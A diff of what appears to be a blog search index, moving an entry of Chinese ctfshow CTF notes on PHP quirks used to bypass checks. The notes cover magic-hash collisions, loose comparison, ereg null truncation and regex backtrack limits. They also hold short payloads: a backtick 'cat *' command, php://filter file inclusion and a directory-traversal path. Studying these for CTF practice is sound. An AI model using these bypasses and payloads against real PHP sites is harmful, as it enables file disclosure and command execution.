@@ -110,204 +110,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php特性</title>
-    <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
-    <content><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="1-intval函数"><a href="#1-intval函数" class="headerlink" title="1.intval函数:"></a>1.intval函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题"><a href="#2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题" class="headerlink" title="2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题"></a>2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题</h3><h4 id="1-对于-不在意数据类型的情况"><a href="#1-对于-不在意数据类型的情况" class="headerlink" title="1.对于&#x3D;&#x3D;不在意数据类型的情况:"></a>1.对于&#x3D;&#x3D;不在意数据类型的情况:</h4><figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">在php中，变量都是弱类型的（就是不指定特定数据类型的），使用<span class="keyword">if</span>判等的时候要格外小心，使用特殊的参数可能会使本来不相等的<span class="keyword">if</span>判断位相等 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---传入a=s1885207154a，b=s1836677006a二者md5都是<span class="number">0</span>e开头，在php中<span class="number">0</span>e会被当做科学计数法，就算后面有字母，其结果也是<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">全字母原值:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">全数字原值:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">以下值在sha1加密后以<span class="number">0</span>E开头：</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>2.对于&#x3D;&#x3D;&#x3D;</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>
-
-<h3 id="3-in-array-函数"><a href="#3-in-array-函数" class="headerlink" title="3.in_array()函数:"></a>3.in_array()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line">    --如果没有使用第三个值strict，那么needle如果为<span class="number">1</span>.php 则也会成功匹配</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-Reflectionclass类"><a href="#4-Reflectionclass类" class="headerlink" title="4.Reflectionclass类:"></a>4.Reflectionclass类:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用 ReflectionClass，可以获取类的属性、方法、常量、父类、接口等信息，也可以动态地调用类的构造函数或方法等</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; 可以得到所有MyClass类的全部信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-hex2bin函数"><a href="#5-hex2bin函数" class="headerlink" title="5.hex2bin函数:"></a>5.hex2bin函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">赋值符号=优先级高于<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---转换十六进制字符串为二进制字符串</span><br><span class="line">is_numeric函数:   如果传入的参数只有一个e字母，则返回<span class="literal">true</span>---科学计数法，全是数字<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --这个命令通过base64，在bin2hex后，输出只有一个e的数字</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-ereg-函数-PHP-7-中被移除"><a href="#6-ereg-函数-PHP-7-中被移除" class="headerlink" title="6.ereg()函数(PHP 7 中被移除)"></a>6.ereg()函数(PHP 7 中被移除)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ereg函数存在<span class="literal">NULL</span>截断漏洞，导致了正则过滤被绕过,所以可以使用%<span class="number">00</span>截断正则匹配</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-Exception类"><a href="#7-Exception类" class="headerlink" title="7.Exception类"></a>7.Exception类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>是所有用户级异常的基类</span><br><span class="line">                             --第一个参数，会把返回值当作错误信息输出</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-FilesystemIterator文件系统迭代器"><a href="#8-FilesystemIterator文件系统迭代器" class="headerlink" title="8.FilesystemIterator文件系统迭代器"></a>8.FilesystemIterator文件系统迭代器</h3> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 是 PHP 中基于 SPL（Standard PHP Library）的一个迭代器类，用来遍历文件系统。</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---两种访问当前目录的方法</span><br></pre></td></tr></table></figure>
-
-<h3 id="9-全局数组-GLOBALS"><a href="#9-全局数组-GLOBALS" class="headerlink" title="9. 全局数组$GLOBALS"></a>9. 全局数组$GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">全局数组<span class="variable">$GLOBALS</span>：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --输出全部信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="10-proc-self-root"><a href="#10-proc-self-root" class="headerlink" title="10.&#x2F;proc&#x2F;self&#x2F;root"></a>10.&#x2F;proc&#x2F;self&#x2F;root</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root 是 Linux 系统中一个特殊的符号链接，它始终指向当前进程的根目录。</span><br></pre></td></tr></table></figure>
-
-<h3 id="11-post传参"><a href="#11-post传参" class="headerlink" title="11.post传参"></a>11.post传参</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">特性<span class="number">1</span>：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _</span><br><span class="line">特性<span class="number">2</span>：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换  ---php8以前</span><br></pre></td></tr></table></figure>
-
-<h3 id="12-传参时"><a href="#12-传参时" class="headerlink" title="12.传参时"></a>12.传参时</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --绕过关键字</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --文件包含</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="13-eval函数与assert函数"><a href="#13-eval函数与assert函数" class="headerlink" title="13.eval函数与assert函数"></a>13.eval函数与assert函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都用于执行php函数 </span><br></pre></td></tr></table></figure>
-
-<h3 id="14-SERVER-‘argv’"><a href="#14-SERVER-‘argv’" class="headerlink" title="14.$_SERVER[‘argv’]"></a>14.$_SERVER[‘argv’]</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] 就等于 <span class="variable">$_SERVER</span>[‘QUERY_STRING’]，<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 就是查询 (query) 的字符串</span><br><span class="line">                                    ---URL中 ? 号后面的原始参数字符串（不解析，不解码，直接拿原样的 query <span class="keyword">string</span>）。</span><br><span class="line">                                    ---需要php.ini 开启了register_argc_argv 配置项。</span><br></pre></td></tr></table></figure>
-
-<h3 id="15-extract函数"><a href="#15-extract函数" class="headerlink" title="15.extract函数"></a>15.extract函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">从数组中将变量导入到当前的符号表</span><br><span class="line">一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</span><br><span class="line">    ---只需要键值对就行了?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,这样也会解析              </span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="16-gettext拓展"><a href="#16-gettext拓展" class="headerlink" title="16.gettext拓展:"></a>16.gettext拓展:</h3><figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()等价于_()</span><br><span class="line">      --使用gettext()相当于echo </span><br></pre></td></tr></table></figure>
-
-<h3 id="17-stripos-函数"><a href="#17-stripos-函数" class="headerlink" title="17.stripos()函数:"></a>17.stripos()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">        --配合目录穿越使用../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="18-正则表达式溢出"><a href="#18-正则表达式溢出" class="headerlink" title="18.正则表达式溢出:"></a>18.正则表达式溢出:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则(pcre)最大回溯/递归限制</span><br><span class="line">    在使用.*?ctfshow非贪婪模式时--匹配到了ctfshow，但是如果ctfshow前面有<span class="number">10</span>万个字符，那么正则会返回<span class="literal">false</span></span><br><span class="line">        --使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</span><br><span class="line">        --默认的backtrack_limit是<span class="number">100000</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="19-php运算符优先级"><a href="#19-php运算符优先级" class="headerlink" title="19.php运算符优先级"></a>19.php运算符优先级</h3><table>
-<thead>
-<tr>
-<th>优先级</th>
-<th>运算符</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td><code>()</code></td>
-<td>括号（表达式分组）</td>
-<td>&#96;($a &amp;&amp; $b)</td>
-</tr>
-<tr>
-<td>2</td>
-<td><code>!</code></td>
-<td>逻辑非</td>
-<td><code>!$a</code></td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>* / %</code></td>
-<td>乘 &#x2F; 除 &#x2F; 取模</td>
-<td><code>$a * $b</code>, <code>$a % $b</code></td>
-</tr>
-<tr>
-<td>4</td>
-<td><code>+ -</code></td>
-<td>加 &#x2F; 减</td>
-<td><code>$a + $b</code></td>
-</tr>
-<tr>
-<td>5</td>
-<td><code>.</code></td>
-<td>字符串连接</td>
-<td><code>$a . $b</code></td>
-</tr>
-<tr>
-<td>6</td>
-<td><code>&lt; &gt; &lt;= &gt;=</code></td>
-<td>比较大小</td>
-<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
-</tr>
-<tr>
-<td>7</td>
-<td><code>== != === !==</code></td>
-<td>相等 &#x2F; 不等 &#x2F; 全等等</td>
-<td><code>$a === $b</code>, <code>$a != $b</code></td>
-</tr>
-<tr>
-<td>8</td>
-<td><code>&amp;</code></td>
-<td>按位与</td>
-<td><code>$a &amp; $b</code></td>
-</tr>
-<tr>
-<td>9</td>
-<td><code>^</code></td>
-<td>按位异或</td>
-<td><code>$a ^ $b</code></td>
-</tr>
-<tr>
-<td>10</td>
-<td>&#96;</td>
-<td>&#96;</td>
-<td>按位或</td>
-</tr>
-<tr>
-<td>11</td>
-<td><code>&amp;&amp;</code></td>
-<td>逻辑与（短路）</td>
-<td><code>$a &amp;&amp; $b</code></td>
-</tr>
-<tr>
-<td>12</td>
-<td>&#96;</td>
-<td></td>
-<td>&#96;</td>
-</tr>
-<tr>
-<td>13</td>
-<td><code>?:</code></td>
-<td>三元运算（条件表达式）</td>
-<td><code>$a ? $b : $c</code></td>
-</tr>
-<tr>
-<td>14</td>
-<td><code>=</code> <code>+=</code> <code>-=</code> 等</td>
-<td>赋值及复合赋值</td>
-<td><code>$a = $b</code>, <code>$a += 1</code></td>
-</tr>
-<tr>
-<td>15</td>
-<td><code>and</code></td>
-<td>逻辑与（低优先）</td>
-<td><code>$a = true and false</code></td>
-</tr>
-<tr>
-<td>16</td>
-<td><code>or</code></td>
-<td>逻辑或（最低优先）</td>
-<td><code>$a = false or true</code></td>
-</tr>
-</tbody></table>
-<h3 id="20-parse-str-函数"><a href="#20-parse-str-函数" class="headerlink" title="20.parse_str()函数:"></a>20.parse_str()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">如果 <span class="keyword">string</span> 是 URL 传递入的查询字符串（query <span class="keyword">string</span>），</span><br><span class="line">则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP <span class="number">7.2</span> 中将废弃不设置参数的行为。</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> 起，result 参数是强制的。</span><br><span class="line">对于<span class="title function_ invoke__">parse_str</span>()，如果传入的是一个数组，例如arr[]=<span class="number">1</span>，则会将变量保存在数组当中arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="21-类"><a href="#21-类" class="headerlink" title="21.类"></a>21.类</h3><h4 id="1-非静态方法-无static"><a href="#1-非静态方法-无static" class="headerlink" title="1.非静态方法(无static)"></a>1.非静态方法(无static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直接<span class="keyword">new</span>一个对象，通过对象来进行调用</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-静态方法-static"><a href="#2-静态方法-static" class="headerlink" title="2.静态方法(static)"></a>2.静态方法(static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">静态方法在类ctfshow，限制了不能去<span class="keyword">new</span>，直接::调用即可</span><br></pre></td></tr></table></figure>
-
-<h3 id="22-call-user-func-函数与call-user-func-array-函数类似"><a href="#22-call-user-func-函数与call-user-func-array-函数类似" class="headerlink" title="22.call_user_func()函数与call_user_func_array()函数类似:"></a>22.call_user_func()函数与call_user_func_array()函数类似:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"> --如果传递一个数组，对于类来说，会把数组的第一个元素当作类名，第二个元素当作类的函数</span><br></pre></td></tr></table></figure>
-
-<h3 id="23-PHP-弱类型特性"><a href="#23-PHP-弱类型特性" class="headerlink" title="23.PHP 弱类型特性(&#x3D;&#x3D;)"></a>23.PHP 弱类型特性(&#x3D;&#x3D;)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP 弱比较 == 的转换规则：</span><br><span class="line">   如果一边是数字，另一边是字符串，PHP 会尝试把字符串转换为数字！  </span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>比较类型</th>
-<th>PHP行为</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>数字 vs 字符串</td>
-<td>字符串会被<strong>强制转换为数字</strong>再比较</td>
-</tr>
-<tr>
-<td>字符串 vs 字符串（若一方看起来像数字）</td>
-<td>会尝试<strong>两边都转成数字</strong>再比较</td>
-</tr>
-<tr>
-<td>布尔 vs 任意类型</td>
-<td>会都转成布尔值再比较</td>
-</tr>
-<tr>
-<td>数组&#x2F;对象 vs 标量</td>
-<td>一律为 <code>false</code></td>
-</tr>
-</tbody></table>
-<h3 id="24-create-function-函数"><a href="#24-create-function-函数" class="headerlink" title="24.create_function()函数:"></a>24.create_function()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>执行顺序</p>
@@ -1606,6 +1408,204 @@
       </tags>
   </entry>
   <entry>
+    <title>php特性</title>
+    <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="1-intval函数"><a href="#1-intval函数" class="headerlink" title="1.intval函数:"></a>1.intval函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题"><a href="#2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题" class="headerlink" title="2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题"></a>2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题</h3><h4 id="1-对于-不在意数据类型的情况"><a href="#1-对于-不在意数据类型的情况" class="headerlink" title="1.对于&#x3D;&#x3D;不在意数据类型的情况:"></a>1.对于&#x3D;&#x3D;不在意数据类型的情况:</h4><figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">在php中，变量都是弱类型的（就是不指定特定数据类型的），使用<span class="keyword">if</span>判等的时候要格外小心，使用特殊的参数可能会使本来不相等的<span class="keyword">if</span>判断位相等 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---传入a=s1885207154a，b=s1836677006a二者md5都是<span class="number">0</span>e开头，在php中<span class="number">0</span>e会被当做科学计数法，就算后面有字母，其结果也是<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">全字母原值:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">全数字原值:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">以下值在sha1加密后以<span class="number">0</span>E开头：</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.对于&#x3D;&#x3D;&#x3D;</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>
+
+<h3 id="3-in-array-函数"><a href="#3-in-array-函数" class="headerlink" title="3.in_array()函数:"></a>3.in_array()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line">    --如果没有使用第三个值strict，那么needle如果为<span class="number">1</span>.php 则也会成功匹配</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Reflectionclass类"><a href="#4-Reflectionclass类" class="headerlink" title="4.Reflectionclass类:"></a>4.Reflectionclass类:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用 ReflectionClass，可以获取类的属性、方法、常量、父类、接口等信息，也可以动态地调用类的构造函数或方法等</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; 可以得到所有MyClass类的全部信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-hex2bin函数"><a href="#5-hex2bin函数" class="headerlink" title="5.hex2bin函数:"></a>5.hex2bin函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">赋值符号=优先级高于<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---转换十六进制字符串为二进制字符串</span><br><span class="line">is_numeric函数:   如果传入的参数只有一个e字母，则返回<span class="literal">true</span>---科学计数法，全是数字<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --这个命令通过base64，在bin2hex后，输出只有一个e的数字</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-ereg-函数-PHP-7-中被移除"><a href="#6-ereg-函数-PHP-7-中被移除" class="headerlink" title="6.ereg()函数(PHP 7 中被移除)"></a>6.ereg()函数(PHP 7 中被移除)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ereg函数存在<span class="literal">NULL</span>截断漏洞，导致了正则过滤被绕过,所以可以使用%<span class="number">00</span>截断正则匹配</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Exception类"><a href="#7-Exception类" class="headerlink" title="7.Exception类"></a>7.Exception类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>是所有用户级异常的基类</span><br><span class="line">                             --第一个参数，会把返回值当作错误信息输出</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-FilesystemIterator文件系统迭代器"><a href="#8-FilesystemIterator文件系统迭代器" class="headerlink" title="8.FilesystemIterator文件系统迭代器"></a>8.FilesystemIterator文件系统迭代器</h3> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 是 PHP 中基于 SPL（Standard PHP Library）的一个迭代器类，用来遍历文件系统。</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---两种访问当前目录的方法</span><br></pre></td></tr></table></figure>
+
